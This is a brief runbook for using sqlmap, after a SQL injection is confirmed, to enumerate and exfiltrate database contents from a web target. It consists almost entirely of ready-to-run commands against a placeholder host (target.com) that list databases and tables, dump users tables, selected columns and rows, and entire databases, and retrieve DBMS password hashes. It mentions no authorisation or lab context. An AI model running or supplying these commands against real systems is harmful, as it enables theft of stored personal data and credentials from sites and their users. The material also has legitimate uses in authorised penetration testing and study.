# SQLMap Database Enumeration – Quick Runbook

---

## Purpose
After SQLi confirmation, enumerate and exfiltrate DB data.

---

## 1. Basic DB Info
```bash
sqlmap -u http://target.com/?id=1 \
  --banner --current-user --current-db --is-dba
````

Gets:

* DB version
* Current DB user
* Current DB name
* DBA privileges

---

## 2. List Databases

```bash
sqlmap -u http://target.com/?id=1 --dbs
```

---

## 3. List Tables (Target DB)

```bash
sqlmap -u http://target.com/?id=1 -D testdb --tables
```

---

## 4. Dump Table

```bash
sqlmap -u http://target.com/?id=1 -D testdb -T users --dump
```

Output saved locally (CSV by default).

---

## 5. Dump Specific Columns

```bash
sqlmap -u http://target.com/?id=1 \
  -D testdb -T users -C name,surname --dump
```

---

## 6. Dump Specific Rows

```bash
sqlmap -u http://target.com/?id=1 \
  -D testdb -T users --start=2 --stop=3 --dump
```

---

## 7. Conditional Dump (WHERE)

```bash
sqlmap -u http://target.com/?id=1 \
  -D testdb -T users --where="name LIKE 'f%'" --dump
```

---

## 8. Dump Entire Database

```bash
sqlmap -u http://target.com/?id=1 -D testdb --dump
```

---

## 9. Dump All Databases (Careful)

```bash
sqlmap -u http://target.com/?id=1 \
  --dump-all --exclude-sysdbs
```

---

## 10. Password Hashes

```bash
sqlmap -u http://target.com/?id=1 --passwords
```

---

## 11. Output Format

```bash
sqlmap ... --dump-format=SQLite
```

Options: `CSV` (default), `HTML`, `SQLite`

---

## Notes

* SQLMap auto-selects queries per DBMS
* Blind SQLi = slower (row/bit based)
* `root` / `DBA` ≠ OS root

---




